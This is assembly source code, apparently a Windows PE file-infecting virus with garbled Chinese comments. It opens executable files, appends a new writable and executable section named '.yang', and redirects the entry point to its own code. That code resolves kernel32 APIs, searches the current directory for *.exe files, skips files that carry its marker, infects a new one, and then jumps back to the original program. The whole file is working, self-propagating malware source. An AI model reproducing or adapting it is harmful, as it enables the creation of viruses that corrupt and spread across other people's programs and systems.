;szlstrcmp               db  'lstrcmpA',0

;szCopyFile              db   'CopyFileA',0

;szwsprintf               db  'wsprintfA',0

 ; ���㰴��ָ��ֵ��������ֵ
;������_Align�������ӵ��������뵱��
@Align2		proc	_dwSize,_dwAlign
		push	edx
		mov	eax,_dwSize
		xor	edx,edx
		div	_dwAlign
		.if	edx
			inc	eax
		.endif
		mul	_dwAlign
		pop	edx
		ret
@Align2		endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;������_ProcessPeFile�������ӵ��������뵱��

@ProcessPeFile3   proc  f_Name            ;f_NameΪ����Ⱦ�ļ�
		local	@szNewFile[MAX_PATH]:byte
		local	@hFile,@dwTemp,@dwEntry,@lpMemory,@OldEntry
              local  fTemp0,@dwFileSize,pNewSec
		local	@szBuffer[256]:byte

              pushad 
;********************************************************************
; ��Part 1��׼��������1���������ļ���2�����ļ�
;********************************************************************
           	invoke	[ebx+_CreateFile],f_Name,GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or \
			FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL
              mov	@hFile,eax
		.if	eax ==	INVALID_HANDLE_VALUE
		  jmp _Exit0
              .endif	
		invoke	[ebx+_GetFileSize], @hFile, NULL
		mov	@dwFileSize,eax		
              .if	eax == 0
                jmp _Exit1
              .endif
	       invoke [ebx+_GlobalAlloc], GPTR, @dwFileSize
              mov	@lpMemory,eax
              .if	eax == 0
                jmp _Exit1
              .endif
              invoke [ebx+_ReadFile], @hFile, @lpMemory, @dwFileSize, ADDR fTemp0, NULL
	;********************************************************************
              mov esi, @lpMemory
              assume	esi:ptr IMAGE_DOS_HEADER
              mov eax, [esi].e_lfanew
              add eax, @lpMemory
              assume esi:nothing
              mov esi, eax              
              assume	esi:ptr IMAGE_NT_HEADERS
              
              movzx eax, [esi].FileHeader.NumberOfSections
              dec eax
              mov  ecx, sizeof IMAGE_SECTION_HEADER
              mul  ecx
              mov  edx, esi
              add  edx, sizeof IMAGE_NT_HEADERS
              add  edx, eax
              mov  ecx, edx
              add  ecx, sizeof IMAGE_SECTION_HEADER
              ;invoke	[ebx+_MessageBox],0,addr @szNewFile,f_Name,MB_OK
              
; esi --> Pe Head 
; edx --> ���һ���ڱ�ecx --> �¼ӵĽڱ�
             ;ecx��λ������½ڱ�ṹ��ʼλ��        ;edx��λ��ԭ���ļ����һ���ڱ�ṹ��ʼλ��
		assume	ecx:ptr IMAGE_SECTION_HEADER,edx:ptr IMAGE_SECTION_HEADER
              inc [esi].FileHeader.NumberOfSections            ;�ڸ�����1
 		mov	eax,[edx].PointerToRawData                ;���ڻ����ļ���ƫ����-->eax
		add	eax,[edx].SizeOfRawData                   ;����ռ�ó���+eax-->eax��Ϊ�½ڵ��ļ�ƫ��
   		mov	[ecx].PointerToRawData,eax                ;�õ��½ڵ��ļ�ƫ��
              ;�����½��ļ�����󳤶�
              mov eax, offset APPEND_CODE_END-offset APPEND_CODE
		invoke	@Align2, eax, [esi].OptionalHeader.FileAlignment   
		mov	[ecx].SizeOfRawData,eax      ;�ļ������ڳ���
              ;�����½��ڴ����󳤶�
              mov eax, offset APPEND_CODE_END-offset APPEND_CODE
		invoke	@Align2,eax,[esi].OptionalHeader.SectionAlignment  
		add	[esi].OptionalHeader.SizeOfCode,eax	;��������δ�СSizeOfCode
		add	[esi].OptionalHeader.SizeOfImage,eax	;�����ڴ�������PEӳ����ĳߴ�SizeOfImage
              ;�����½ڵ��ڴ�ƫ��
   		invoke	@Align2,[edx].Misc.VirtualSize,[esi].OptionalHeader.SectionAlignment
		add	eax,[edx].VirtualAddress      
              mov	[ecx].VirtualAddress,eax                  ;�õ��½ڵ��ڴ�ƫ��
		mov	[ecx].Misc.VirtualSize,offset APPEND_CODE_END-offset APPEND_CODE
		mov	[ecx].Characteristics,IMAGE_SCN_CNT_CODE\             ;�����½ڵ�����Ϊ�����롱+����ִ�С�+���ɶ���+����д��
			or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
              ;**************************************************************
              ;���ý���Ϊ ".zhao"  (�����е�)
              lea eax, [ecx].Name1       
              mov byte ptr[eax],'.'              
              mov byte ptr[eax+1],'y'
              mov byte ptr[eax+2],'a'
              mov byte ptr[eax+3],'n'
              mov byte ptr[eax+4],'g'
              mov byte ptr[eax+5],0 

;********************************************************************
;�����ļ����ָ�롣�˴�����֮���pushad....popad����ȥ������Ϊ�������ĺ������ƻ�ָ�������ecx������
;********************************************************************
		mov	eax,[ecx].VirtualAddress
		add	eax,(offset _NewEntry-offset APPEND_CODE)
              push   [esi].OptionalHeader.AddressOfEntryPoint      ;�͸�@@dwEntry
		mov	[esi].OptionalHeader.AddressOfEntryPoint,eax          ;�����µ���ڵ�ַ,Ϊ��Ե�ַ
              pop    @dwEntry      ;����Ҫ��
              pushad 
              invoke [ebx+_GlobalAlloc], GPTR, [ecx].SizeOfRawData              
              mov	pNewSec,eax  
              popad  
              ;pushad
              ;invoke [ebx+_RtlZeroMemory],pNewSec, [ecx].SizeOfRawData
              ;popad
              ;д���ļ�ͷ��ԭ���Ľ�                         
              mov   eax, [edx].PointerToRawData
              add   eax, [edx].SizeOfRawData
              mov   edi, eax  
              ;д��ǰ��ġ�д�볤�Ȳ������ļ����ȣ���Ϊ�е��ļ����渽������
              pushad
              invoke	[ebx+_SetFilePointer],@hFile,0,NULL,FILE_BEGIN
              popad
              pushad
              invoke	[ebx+_WriteFile],@hFile,@lpMemory,edi,addr fTemp0,NULL    
              popad
              ;д���½ڵĳ���
              pushad
              invoke	[ebx+_WriteFile],@hFile,pNewSec,[ecx].SizeOfRawData,addr fTemp0,NULL
              popad
              pushad
              invoke	[ebx+_SetFilePointer],@hFile,edi,NULL,FILE_BEGIN
              popad
              pushad
              mov edi, offset APPEND_CODE_END-offset APPEND_CODE   ;д��ĳ���
              mov eax, offset APPEND_CODE
              add eax, ebx               ;
              mov pNewSec, eax  
              invoke	[ebx+_WriteFile],@hFile,pNewSec,edi,addr fTemp0,NULL      ;
              popad
              pushad
              invoke [ebx+_GlobalFree],pNewSec
              popad     
              
;********************************************************************
; �����¼Ӵ����е� Jmp oldEntry ָ��
;********************************************************************
		
		mov	eax,[ecx].VirtualAddress
		add	eax,(offset _ToOldEntry-offset APPEND_CODE+5)
              sub	@dwEntry, eax
              mov	ecx,[ecx].PointerToRawData      ;���һ���ļ�ƫ��-->ecx
              ;assume	ecx:nothing
		add	ecx,(offset _dwOldEntry-offset APPEND_CODE)  ;_dwOldEntry���ļ�ƫ��
              pushad           
		invoke	[ebx+_SetFilePointer],@hFile,ecx,NULL,FILE_BEGIN
              popad
              pushad  
              invoke	[ebx+_WriteFile],@hFile,addr @dwEntry,4,addr @dwTemp,NULL ;д��_dwOldEntry��ֵΪ@dwEntry
              popad
;********************************************************************
; ��Part 7���ر��ļ�
;********************************************************************	
_Ret:
		assume	esi:nothing
_Exit2:
        invoke	[ebx+_GlobalFree],@lpMemory
_Exit1:
        invoke	[ebx+_CloseHandle],@hFile 
_Exit0:
        popad		 
        ret
@ProcessPeFile3 endp
 
@SearchFile2 proc 
    LOCAL lpName[6]:BYTE
    LOCAL @st:WIN32_FIND_DATA
    LOCAL handle:DWORD
    pushad
    mov al,'*'
    mov lpName,al    
    mov al,'.'
    mov lpName+1,al
    mov al,'e'
    mov lpName+2,al
    mov al,'x'
    mov lpName+3,al
    mov al,'e'
    mov lpName+4,al
    mov al, 0
    mov lpName+5,al
   invoke [ebx+_FindFirstFile], ADDR lpName, ADDR @st
    mov handle, eax
    .if eax == INVALID_HANDLE_VALUE
      jmp _Exit0
    .endif
    ;invoke [ebx+_MessageBox],0,ADDR lpName,0,MB_OK      
    mov esi, TRUE
    .while esi == TRUE  
      invoke [ebx+_FindNextFile], handle, ADDR @st
      mov esi, eax
      ;invoke [ebx+_MessageBox],0,ADDR lpName,ADDR @st.cFileName,MB_OK
      .break .if esi == FALSE     ;���룬��������ļ���������     
      invoke @GetAFile2, ADDR @st.cFileName
      mov ecx, eax      
      .if eax == -1
           ;invoke [ebx+_MessageBox],0,0,ADDR @st.cFileName,MB_OK
           invoke @ProcessPeFile3,ADDR @st.cFileName  ;��Ⱦһ���ļ�
        .break .if ecx == -1     ;��Ⱦһ���ļ��Ժ��˳�
      .else
           
      .endif
    .endw
    invoke [ebx+_FindClose], handle    
_Exit0:    
    popad
    ret
@SearchFile2 endp

@GetAFile2 proc f_Name:DWORD        ;uses ebx ecx edx edi esi, 
  LOCAL hFile:DWORD
  LOCAL hLen:DWORD
  LOCAL temp:DWORD
  LOCAL dos_header:IMAGE_DOS_HEADER      
  LOCAL nt_header:IMAGE_NT_HEADERS      
  LOCAL pSec:DWORD    ;�ڻ�����ָ��  
  LOCAL nSec:DWORD    ;�ڸ���
  LOCAL info[256]:BYTE 

  pushad
  invoke [ebx+_CreateFile], f_Name, GENERIC_READ or GENERIC_WRITE, 0,NULL,OPEN_EXISTING,0,NULL
  mov hFile, eax
  .if hFile == INVALID_HANDLE_VALUE
    ;szText szErrOpen1, "���ܶ�д�ļ�"
    ;lea edx, [ebx+szErrOpen1]
    ;invoke [ebx+_MessageBox],0,edx,f_Name,MB_OK 
    jmp _Exit1   ;��־
  .endif
  invoke [ebx+_GetFileSize],hFile,ADDR temp
  mov hLen,eax
  invoke [ebx+_ReadFile],hFile,ADDR dos_header,sizeof IMAGE_DOS_HEADER,ADDR temp,NULL
  .if dos_header.e_magic!=5A4DH    ;"MZ"
    ;szText szErrFile1, "��MZ�ļ�"
    ;lea  edx, [ebx+szErrFile1]
    ;invoke [ebx+_MessageBox],0, edx,f_Name,MB_OK
    ;invoke [ebx+_CloseHandle], hFile
    jmp _Exit1   ;��־
  .endif
  
  invoke [ebx+_SetFilePointer],hFile,dos_header.e_lfanew,NULL,FILE_BEGIN
  invoke [ebx+_ReadFile],hFile,ADDR nt_header,sizeof IMAGE_NT_HEADERS,ADDR temp, NULL
  .if nt_header.Signature != 4550H    ;"PE"
    ;szText szErrFile21, "��PE�ļ�"
    ;lea edx, [ebx+szErrFile21]
    ;invoke [ebx+_MessageBox],0,edx,f_Name,MB_OK 
    ;invoke [ebx+_CloseHandle], hFile
    jmp _Exit1   ;��־
  .endif

  invoke [ebx+_GlobalAlloc],GPTR,hLen
  mov pSec,eax
  .if eax == NULL
      ;szText MemoryErr1,"�ڴ����ʧ��"
      ;lea edx, [ebx+MemoryErr1]
      ;invoke [ebx+_MessageBox], 0, edx, f_Name, MB_OK 
      ;invoke [ebx+_CloseHandle],hFile
      jmp _Exit1   ;��־
 .endif
 invoke [ebx+_SetFilePointer],hFile,0,NULL,FILE_BEGIN
 invoke [ebx+_ReadFile],hFile,pSec,hLen,ADDR temp,NULL

 mov edx, pSec
 assume	edx:ptr IMAGE_DOS_HEADER
 mov edi, pSec
 add edi, [edx].e_lfanew
 mov esi, edi
 assume  edi:ptr  IMAGE_NT_HEADERS
 xor eax, eax
 mov ax, [edi].FileHeader.NumberOfSections
 mov nSec, eax           ;�ڸ���
 add esi, sizeof IMAGE_NT_HEADERS
 mov ecx, sizeof IMAGE_SECTION_HEADER
 xor eax, eax
 mov eax, nSec
 mul cx                   ;cxΪnSec���ڱ�ռ�ÿռ�
 add eax, esi             ;eaxΪ���һ���ڱ�ṹ��һ���ֽ�
 mov ecx, eax
 sub ecx, sizeof IMAGE_SECTION_HEADER          ;ecxΪ���һ���ڱ�
 sub eax, pSec
 add eax, sizeof IMAGE_SECTION_HEADER          ;�ټ�ȥһ���ڱ�(������һ��������)
 assume	esi:ptr IMAGE_SECTION_HEADER
 ;movzx  eax, 
 ;assume	ecx:ptr IMAGE_SECTION_HEADER
 ;lea edi, [esi].Name1
 ;invoke [ebx+_MessageBox],0, edi, edi, MB_OK
 ;.if eax != 0       ;û�з��ֲ�����־
 ;  
 
 .if eax <= [esi].PointerToRawData             ;���ڱ�ṹλ��С�ڵ�һ�ڵ��ļ�ƫ��[esi].PointerToRawData
   movzx eax, [edi].FileHeader.NumberOfSections
   mov ecx, sizeof IMAGE_SECTION_HEADER
   dec eax
   mul cx
   mov ecx, esi
   add ecx, eax
   assume	ecx:ptr IMAGE_SECTION_HEADER
   lea edi, [ecx].Name1
   ;invoke [ebx+_MessageBox],0, edi, edi, MB_OK
   inc edi
 ;**************************************************************
   ;�����".yang"�ں�Ͳ���Ⱦ
   .if byte ptr[edi] == 'y' && byte ptr[edi+1] == 'a' && byte ptr[edi+2] == 'n' && byte ptr[edi+3] == 'g'
    invoke [ebx+_GlobalFree], pSec
    invoke [ebx+_CloseHandle],hFile
    jmp _Exit1
   .endif
   
   ;szText tell_11,  "���Ը�Ⱦ ***%s***"
   ;lea edx, [ebx+tell_11]
   ;invoke [ebx+_wsprintf], ADDR info, edx, f_Name
   ;invoke [ebx+_MessageBox],0,ADDR info,0,MB_OK
   invoke [ebx+_GlobalFree], pSec
   invoke [ebx+_CloseHandle],hFile
   jmp _Exit2        ;ֻ��Ⱦһ���ļ�
 .endif
 invoke [ebx+_GlobalFree], pSec
 invoke [ebx+_CloseHandle],hFile

_Exit2:
 popad
 mov eax, -1
 jmp  _Exit0

_Exit1:
 popad
 xor eax, eax

_Exit0:
 ret
@GetAFile2 endp


;********************************************************************
; �µ���ڵ�ַ
;********************************************************************
_NewEntry:
;********************************************************************
; �ض�λ����ȡһЩ API ����ڵ�ַ
;********************************************************************
		call	@F
		@@:
		pop	ebx
		sub	ebx,offset @B
;********************************************************************
		invoke	_GetKernelBase,[esp]	;��ȡKernel32.dll��ַ
		.if	! eax
			jmp	_ToOldEntry
		.endif
		mov	[ebx+hDllKernel32],eax	
		lea	eax,[ebx+szGetProcAddress]
		invoke	_GetApi,[ebx+hDllKernel32],eax;��ȡGetProcAddress���
		.if	! eax
			jmp	_ToOldEntry
		.endif
		mov	[ebx+_GetProcAddress],eax
;********************************************************************
		lea	eax,[ebx+szLoadLibrary]	;��ȡLoadLibrary���
		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
		mov	[ebx+_LoadLibrary],eax
;********************************************************************                                           
              lea	eax,[ebx+szKernel32]	;��ȡLoadLibrary���
		invoke	[ebx+_LoadLibrary],eax  ;��LoadLibrary��kernel32.dll
		mov	[ebx+hDllKernel32],eax  ;�õ�kernel32.dll���ڴ���

;����GetProcAddress��ȡCreateFile��ַ                
                lea	eax,[ebx+szCreateFile]
		  invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
                mov [ebx+_CreateFile],eax
;����GetProcAddress��ȡReadFile��ַ      
                lea	eax,[ebx+szReadFile]
		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
                mov [ebx+_ReadFile],eax
;����GetProcAddress��ȡWriteFile��ַ      
                lea	eax,[ebx+szWriteFile]
		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
                mov [ebx+_WriteFile],eax
;����GetProcAddress��ȡSetFilePointer��ַ      
                lea	eax,[ebx+szSetFilePointer]
		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
                mov [ebx+_SetFilePointer],eax
;����GetProcAddress��ȡCloseHandle��ַ      
                lea	eax,[ebx+szCloseHandle]
		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
                mov [ebx+_CloseHandle],eax
;����GetProcAddress��ȡSetEndOfFile��ַ      
;                lea	eax,[ebx+szSetEndOfFile]
;		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
;                mov [ebx+_SetEndOfFile],eax
                
;����GetProcAddress��ȡGetFileSize��ַ      
                lea	eax,[ebx+szGetFileSize]
		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
                mov [ebx+_GetFileSize],eax
;����GetProcAddress��ȡGlobalAlloc��ַ      
                lea	eax,[ebx+szGlobalAlloc]
		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
                mov [ebx+_GlobalAlloc],eax
;����GetProcAddress��ȡGlobalFree��ַ      
                lea	eax,[ebx+szGlobalFree]
		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
                mov [ebx+_GlobalFree],eax
;����GetProcAddress��ȡExitProcess��ַ      
;                lea	eax,[ebx+szExitProcess]
;		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
;                mov [ebx+_ExitProcess],eax
;����GetProcAddress��ȡGetModuleHandle��ַ      
;                lea	eax,[ebx+szGetModuleHandle]
;		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
;                mov [ebx+_GetModuleHandle],eax
;����GetProcAddress��ȡGetModuleFileName��ַ      
;                lea	eax,[ebx+szGetModuleFileName]
;		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
;                mov [ebx+_GetModuleFileName],eax
;����GetProcAddress��ȡRtlZeroMemory��ַ      
;                lea	eax,[ebx+szRtlZeroMemory]
;		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
;                mov [ebx+_RtlZeroMemory],eax
;����GetProcAddress��ȡlstrcpy��ַ      
;                lea	eax,[ebx+szlstrcpy]
;		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
;                mov [ebx+_lstrcpy],eax
;����GetProcAddress��ȡlstrcat��ַ      
;                lea	eax,[ebx+szlstrcat]
;		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
;                mov [ebx+_lstrcat],eax
;����GetProcAddress��ȡlstrcpyn��ַ      
;                lea	eax,[ebx+szlstrcpyn]
;		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
;                mov [ebx+_lstrcpyn],eax
;����GetProcAddress��ȡlstrlen��ַ      
;                lea	eax,[ebx+szlstrlen]
;		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
;              mov [ebx+_lstrlen],eax
;����GetProcAddress��ȡlstrcmp��ַ      
;                lea	eax,[ebx+szlstrcmp]
;		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
;              mov [ebx+_lstrcmp],eax

		lea	eax,[ebx+szUser32]	;��ȡUser32.dll��ַ
		invoke	[ebx+_LoadLibrary],eax
		mov	[ebx+hDllUser32],eax
		lea	eax,[ebx+szMessageBox]	;��ȡMessageBox���
		invoke	[ebx+_GetProcAddress],[ebx+hDllUser32],eax
		mov	[ebx+_MessageBox],eax
		;lea	eax,[ebx+szwsprintf]	;��ȡwsprintf���
		;invoke	[ebx+_GetProcAddress],[ebx+hDllUser32],eax
		;mov	[ebx+_wsprintf],eax

;����GetProcAddress��ȡFindFirstFile
                lea	eax,[ebx+szFindFirstFile]
		  invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
                mov [ebx+_FindFirstFile],eax
;����GetProcAddress��ȡFindNextFile
                lea	eax,[ebx+szFindNextFile]
		  invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
                mov [ebx+_FindNextFile],eax
;����GetProcAddress��ȡFindClose
                lea	eax,[ebx+szFindClose]
		  invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
                mov [ebx+_FindClose],eax
;����GetProcAddress��ȡCopyFile
;                lea	eax,[ebx+szCopyFile]
;		  invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
;                mov [ebx+_CopyFile],eax

               ; .if eax == 0
               ;     jmp @f
               ;     error_1  db  "FindNextFile_",0
               ;     @@:
               ;     lea ecx, error_1
               ;     add ecx, ebx
               ;     invoke	[ebx+_MessageBox],NULL,ecx,ecx,MB_OK
               ; .endif             


		lea	ecx,[ebx+szText1]
		lea	eax,[ebx+szCaption]                		
              invoke	[ebx+_MessageBox],NULL,ecx,eax,MB_OK      ;��ʾ�Ѿ���Ⱦ
		;.if	eax !=	IDYES
                call  @SearchFile2
                ;invoke  [ebx+_ExitProcess],0    ;�����ȽϺ�
		  ;ret
		;.endif
            
;********************************************************************
; ִ��ԭ�����ļ�
;********************************************************************
_ToOldEntry:
		db	0e9h	;0e9h��jmp xxxxxxxx�Ļ�����
             ;_dwOldEntry=(ԭ�������RVA��ַ-jmp xxx����ָ���RVA��ַ)
_dwOldEntry	dd	44332211h	;��������ԭ������ڵ�ַ
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


APPEND_CODE_END	equ	this byte

  ; ���㰴��ָ��ֵ��������ֵ
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_Align		proc	_dwSize,_dwAlign

		push	edx
		mov	eax,_dwSize
		xor	edx,edx
		div	_dwAlign
		.if	edx
			inc	eax
		.endif
		mul	_dwAlign
		pop	edx
		ret

_Align		endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_ProcessPeFile   proc uses eax ebx ecx edx edi esi,_lpFile,_lpPeHead,_dwSize,f_Name
		local	@szNewFile[MAX_PATH]:byte
		local	@hFile,@dwTemp,@dwEntry,@lpMemory
              local  fTemp0:DWORD
		local	@szBuffer[256]:byte

		pushad
;********************************************************************
; ��Part 1��׼��������1���������ļ���2�����ļ�
;********************************************************************
		invoke	lstrcpy,addr @szNewFile,f_Name
		;invoke	lstrlen,addr @szNewFile
		;lea	ecx,@szNewFile
		;mov	byte ptr [ecx+eax-4],0
		;invoke	lstrcat,addr @szNewFile,addr szExt
		;invoke	CopyFile,f_Name ,addr @szNewFile,FALSE
              ;invoke	MessageBox,0,addr @szNewFile,f_Name,MB_OK
		invoke	CreateFile,addr @szNewFile,GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ or \
			FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL
		.if	eax ==	INVALID_HANDLE_VALUE
			invoke	MessageBox,0,addr szErrCreate,NULL,MB_OK
			jmp	_Ret
		.endif
		mov	@hFile,eax
;********************************************************************
;��Part 2��
; esi --> ԭPeHead��edi --> �µ�PeHead
; edx --> ���һ���ڱ�ebx --> �¼ӵĽڱ�
;********************************************************************
		mov	esi,_lpPeHead
		assume	esi:ptr IMAGE_NT_HEADERS,edi:ptr IMAGE_NT_HEADERS
		invoke	GlobalAlloc,GPTR,[esi].OptionalHeader.SizeOfHeaders
		mov	edi,eax
		invoke	RtlMoveMemory,edi,_lpFile,[esi].OptionalHeader.SizeOfHeaders
		mov	@lpMemory,eax
		mov	edi,eax
		add	edi,esi
		sub	edi,_lpFile
		movzx	eax,[esi].FileHeader.NumberOfSections
		dec	eax
		mov	ecx,sizeof IMAGE_SECTION_HEADER
		mul	ecx

		mov	edx,edi
		add	edx,eax
		add	edx,sizeof IMAGE_NT_HEADERS
		mov	ebx,edx
		add	ebx,sizeof IMAGE_SECTION_HEADER
		assume	ebx:ptr IMAGE_SECTION_HEADER,edx:ptr IMAGE_SECTION_HEADER
;********************************************************************
; ��Part 3������һ���µĽڣ�������һЩPEͷ��������
;********************************************************************
		inc	[edi].FileHeader.NumberOfSections         ;�ڸ�����1
		mov	eax,[edx].PointerToRawData                ;���ڻ����ļ���ƫ����-->eax
		add	eax,[edx].SizeOfRawData                   ;����ռ�ó���+eax-->eax��Ϊ�½ڵ��ļ�ƫ��
              mov    fTemp0,eax
		mov	[ebx].PointerToRawData,eax                ;�õ��½ڵ��ļ�ƫ��
              ;�����½��ļ�����󳤶�
		invoke	_Align,offset APPEND_CODE_END-offset APPEND_CODE,[esi].OptionalHeader.FileAlignment
		mov	[ebx].SizeOfRawData,eax      ;�����ļ�����
              ;�����½��ڴ����󳤶�
		invoke	_Align,offset APPEND_CODE_END-offset APPEND_CODE,[esi].OptionalHeader.SectionAlignment
		add	[edi].OptionalHeader.SizeOfCode,eax	;��������δ�СSizeOfCode
		add	[edi].OptionalHeader.SizeOfImage,eax	;�����ڴ�������PEӳ����ĳߴ�SizeOfImage
              ;����
		invoke	_Align,[edx].Misc.VirtualSize,[esi].OptionalHeader.SectionAlignment
		add	eax,[edx].VirtualAddress            
		mov	[ebx].VirtualAddress,eax                  ;�õ��½ڵ��ڴ�ƫ��
		mov	[ebx].Misc.VirtualSize,offset APPEND_CODE_END-offset APPEND_CODE
		mov	[ebx].Characteristics,IMAGE_SCN_CNT_CODE\             ;�����½ڵ�����Ϊ�����롱+����ִ�С�+���ɶ���+����д��
			or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
		invoke	lstrcpy,addr [ebx].Name1,addr szMySection
;********************************************************************
; ��Part 4�������ļ����ָ��
;********************************************************************
              mov    eax, [edi].OptionalHeader.AddressOfEntryPoint
              mov    @dwEntry, eax                       ;�����ϵ���ڵ�ַ
		mov	eax,[ebx].VirtualAddress
		add	eax,(offset _NewEntry-offset APPEND_CODE)
		mov	[edi].OptionalHeader.AddressOfEntryPoint,eax          ;�����µ���ڵ�ַ
                            
;********************************************************************
; ��Part 5��д�ļ�
;********************************************************************
              ;д�ļ�ͷ��ԭ��������
		invoke	WriteFile,@hFile,@lpMemory,[esi].OptionalHeader.SizeOfHeaders,\
			addr @dwTemp,NULL
		invoke	SetFilePointer,@hFile,[ebx].PointerToRawData,NULL,FILE_BEGIN
              ;д�´���
		invoke	WriteFile,@hFile,offset APPEND_CODE,[ebx].Misc.VirtualSize,\
			addr @dwTemp,NULL
		mov	eax,[ebx].PointerToRawData
		add	eax,[ebx].SizeOfRawData
		invoke	SetFilePointer,@hFile,eax,NULL,FILE_BEGIN
		invoke	SetEndOfFile,@hFile
;********************************************************************
; ��Part 6�������¼Ӵ����е� Jmp oldEntry ָ��
;********************************************************************
		;push	[esi].OptionalHeader.AddressOfEntryPoint
		;pop	@dwEntry
		mov	eax,[ebx].VirtualAddress
		add	eax,(offset _ToOldEntry-offset APPEND_CODE+5); jmp xxxxxxxx������ָ��ƫ�Ƶ�ַ����СΪ5�ֽڣ����Լ�5
		sub	@dwEntry,eax
		mov	ecx,[ebx].PointerToRawData
		add	ecx,(offset _dwOldEntry-offset APPEND_CODE)

             ;szText inf001,"�Ӵ���%Xh,λ��=%x,�����=%x,�����=%x"
             ;mov fTemp0, APPEND_CODE_END-offset APPEND_CODE
             ;invoke wsprintf,ADDR @szBuffer, ADDR inf001,fTemp0,ecx,[esi].OptionalHeader.AddressOfEntryPoint,@dwEntry
             ;invoke SendMessage,hList,LB_ADDSTRING,0,ADDR @szBuffer

		invoke	SetFilePointer,@hFile,ecx,NULL,FILE_BEGIN
		invoke	WriteFile,@hFile,addr @dwEntry,4,addr @dwTemp,NULL
               
;********************************************************************
; ��Part 7���ر��ļ�
;********************************************************************
		invoke	GlobalFree,@lpMemory
		invoke	CloseHandle,@hFile
_Ret:
		assume	esi:nothing
              invoke	lstrcpy ,f_Name ,addr @szNewFile
		popad	
        ret
_ProcessPeFile endp

AppendCode	proc  uses eax ebx ecx edx edi esi,f_Name:DWORD
		local	@hFile,@dwFileSize,@hMapFile,@lpMemory
;********************************************************************
; ���ļ��������ļ� Mapping
;********************************************************************
      		invoke	CreateFile,f_Name,GENERIC_READ,FILE_SHARE_READ or \
			FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL
		.if	eax !=	INVALID_HANDLE_VALUE
			mov	@hFile,eax
			invoke	GetFileSize,eax,NULL
			mov	@dwFileSize,eax
			.if	eax
				invoke	CreateFileMapping,@hFile,NULL,PAGE_READONLY,0,0,NULL
				.if	eax
					mov	@hMapFile,eax
					invoke	MapViewOfFile,eax,FILE_MAP_READ,0,0,0
					.if	eax
						mov	@lpMemory,eax
;********************************************************************
						mov	esi,@lpMemory
                                         assume	esi:ptr IMAGE_DOS_HEADER
						add	esi,[esi].e_lfanew
                                          assume esi:nothing 
                                          invoke	CloseHandle,@hMapFile
                                          invoke	CloseHandle,@hFile
						invoke	_ProcessPeFile,@lpMemory,esi,@dwFileSize,f_Name
						jmp  _ErrorExit
_ErrFormat:                              jmp @f
                                         szErrFormat1	db	'����ļ�����PE��ʽ���ļ�!',0
                                         @@:
						invoke	MessageBox,0,addr szErrFormat1,NULL,MB_OK
				       invoke	UnmapViewOfFile,@lpMemory
					.endif
					invoke	CloseHandle,@hMapFile
				.endif
				invoke	CloseHandle,@hFile
			.endif
		.endif
_ErrorExit:
		ret

AppendCode	endp
end start

